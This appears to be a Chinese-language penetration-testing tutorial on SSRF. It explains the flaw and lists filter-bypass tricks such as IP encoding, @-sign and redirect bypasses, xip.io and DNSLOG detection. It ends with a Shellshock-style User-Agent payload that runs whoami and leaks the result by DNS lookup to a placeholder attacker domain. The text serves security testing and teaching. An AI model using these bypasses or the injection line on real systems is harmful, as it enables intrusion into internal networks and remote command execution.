# SSRF

# 简介

![SSRF%205eabcf9885914010a5619bd5d875fa32/Untitled.png](SSRF%205eabcf9885914010a5619bd5d875fa32/Untitled.png)

诸如图片上传等功能，经常会允许添加外部的图片链接进行间接上传（如百度的图片链接[https://image.baidu.com/search/detail](https://image.baidu.com/search/detail)?），而对于此类链接的直接信任并且引用，极有可能导致额外的安全风险产生（如上图，本身功能接口被设计为引用第三方站点的文件资源，结果却导致内网系统被【使用网站自身服务器的身份】间接访问）。

此类安全风险被称为Server-Side Request Forgery，服务器端请求伪造。

---

# 原理

此类功能非常容易猜测内部原理，当A网站一个图片上传接口被填写外部网站链接（B网站）后，A网站服务器会解析该链接，并以A网站服务器的身份发送一个GET请求，在返回包的主体中获取对应的图片资源内容。

而这个B网站的链接如果被修改成内部网站地址（如：127.0.0.1、localhost、192.168.0.1-255等），即可被用作探测内网的网络拓扑结构、访问内网特定文件资源、附带特定payload攻击内网应用、写入shell并触发......

---

# 技巧

![SSRF%205eabcf9885914010a5619bd5d875fa32/Untitled%201.png](SSRF%205eabcf9885914010a5619bd5d875fa32/Untitled%201.png)

在 **填写URL地址→过滤链接→解析访问链接** 的过程中，如何过滤链接使得该功能不会导致风险产生，是需要一定的技巧的。

1. 无过滤函数（safe_func()）时，漏洞发现方式
    1. 输入该网站存在的URL路径（如：http://127.0.0.1/dosomething），观察返回包是否是该URL路径的返回格式
    2. vps开启端口监听（如：sudo python3 -m http.server 8009，监听8009端口），观察是否有来自服务器IP的访问请求
    3. 输入该网站所在网段的其他机器，观察返回包是否包含某些特征（如：http://192.168.0.1:80）
2. 黑名单过滤（过滤如127.0.0.1等特征字符串）时，漏洞发现方式
    1. 127.0.0.1等转换成十进制、十六进制、八进制等
    2. 转换成如t.cn的短地址
    3. 限制子网段，可以通过:80等指定端口绕过
3. 白名单过滤（如必须包含某些受信任的域名）时，漏洞发现方式
    1. at绕过（123.com@456.com 与 直接请求456.com相同）
    2. URL跳转绕过（test.com/redirect?url=xxx，与直接请求xxx类似）
    3. xip.io绕过（http://xxx.192.168.0.1.xip.io与192.168.0.1相同）
    4. 将自己的域名解析成指定的内网IP（需要有域名）
4. DNSLOG盲打发现
    1. 通过输入burp collaborator生成的一次性域名或自己的ceye.io地址，查看相关域名的寻址请求来源，判断该功能是否存在SSRF漏洞
5. 其他
    1. referer请求头修改成DNSLOG域名
    2. UA请求头修改成() { :; }; /usr/bin/nslookup $(whoami).YOUR-DNSDOMAIN-ADDRESS

    #上述两点是建立在服务端对于referer或UA存在某些不当校验的基础上